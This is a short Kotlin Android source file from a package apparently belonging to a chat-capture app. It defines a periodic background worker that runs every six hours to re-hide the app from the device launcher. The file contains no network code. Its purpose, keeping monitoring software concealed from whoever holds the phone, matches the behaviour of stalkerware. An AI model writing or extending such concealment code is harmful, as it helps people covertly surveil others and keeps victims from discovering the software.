package com.chats.capture.workers

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.chats.capture.utils.AppHider
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import timber.log.Timber

/**
 * Periodic worker to ensure app stays hidden from launcher
 * Runs every 6 hours to check and re-hide if needed
 */
class AppHiderWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    
    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            Timber.d("AppHiderWorker: Ensuring app stays hidden")
            AppHider.ensureHidden(applicationContext)
            Result.success()
        } catch (e: Exception) {
            Timber.e(e, "Error in AppHiderWorker")
            Result.retry()
        }
    }
}
